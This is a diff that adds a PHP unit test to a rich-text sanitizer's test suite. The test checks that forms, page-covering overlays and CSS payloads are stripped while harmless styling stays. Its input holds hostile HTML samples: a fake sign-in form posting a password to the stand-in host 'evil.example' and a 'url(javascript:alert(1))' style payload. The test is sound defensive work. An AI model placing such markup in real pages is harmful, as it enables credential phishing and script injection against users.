@@ -143,4 +143,26 @@ class RichTextSanitizationTest extends TestCase
     {
         $this->assertNull(RichTextSanitizer::sanitize(null));
     }
+
+    public function test_forms_and_page_covering_styles_are_removed_but_looks_stay(): void
+    {
+        $clean = RichTextSanitizer::sanitize(
+            '<form action="https://evil.example"><input name="password"><button>Sign in</button></form>'
+            .'<div style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:#fff">cover</div>'
+            .'<p style="background:url(javascript:alert(1)); color: #123456; text-align: center">looks</p>'
+            .'<span style="font-family: &quot;Playfair Display&quot;, serif; z-index: 9">font</span>'
+        );
+
+        $this->assertStringNotContainsString('<form', $clean);
+        $this->assertStringNotContainsString('<input', $clean);
+        $this->assertStringNotContainsString('<button', $clean);
+        $this->assertStringNotContainsString('evil.example', $clean);
+        $this->assertStringNotContainsString('position', $clean);
+        $this->assertStringNotContainsString('z-index', $clean);
+        $this->assertStringNotContainsString('url(', $clean);
+        $this->assertStringContainsString('style="width: 100vw; height: 100vh; background: #fff"', $clean);
+        $this->assertStringContainsString('color: #123456; text-align: center', $clean);
+        $this->assertStringContainsString('Playfair Display', $clean);
+        $this->assertStringContainsString('looks', $clean);
+    }
 }
